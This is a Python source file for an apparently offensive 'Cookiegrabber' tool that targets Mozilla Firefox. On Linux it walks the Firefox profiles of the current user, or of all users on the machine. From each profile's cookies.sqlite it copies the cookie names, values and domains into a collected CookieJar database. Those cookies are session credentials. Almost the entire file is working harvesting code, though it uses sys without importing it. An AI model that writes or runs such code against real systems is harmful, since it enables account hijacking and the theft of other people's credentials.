#!/usr/bin/env python3.3
# -*- coding: utf8 -*-
#
# Cookiegrabber for Mozilla
#   Grabs the cookies from Mozilla Firefox 
#
# Copyright (c) 2015    NorthernSec
# Copyright (c) 2015    Pieter-Jan Moreels

# Imports
import getpass
import platform
from lib.Cookie import Cookie
from lib.DatabaseConnection import selectAllFrom, grabJar, addToJar
from lib.Toolkit import getUsers, subdirsOf

class MozillaGrabber():
  def __init__(self):
    if platform.system() == "Linux":
      self.cookieTrail='/home/%s/.mozilla/firefox/%s/cookies.sqlite'
      self.profiles='/home/%s/.mozilla/firefox'
    elif platform.system() == "Windows":
      self.cookieTrail='TODO'
      self.profiles='TODO'
      sys.exit("Still baking these cookies")
    else:
      sys.exit("Unsupported platform")

  def grabAndStore(self, database=None, allUsers=False):
    path = database if database else "../CookieJar.sqlite"
    users=getUsers() if allUsers else [getpass.getuser()]
    grabJar(path)
    cookies=selectAllFrom(path, "CookieJar")
    for u in users:
      for p in self.getProfiles(u):
        for c in selectAllFrom(self.cookieTrail%(u,p), "moz_cookies"):
          addToJar(path, Cookie(c['basedomain'], c['name'], c['value'], 'firefox', '%s:%s'%(u,p), c['lastaccessed'], c['creationtime']))

  def getProfiles(self, user):
    p=subdirsOf(self.profiles%user)
    if "Crash Reports" in p: p.remove("Crash Reports")
    return p
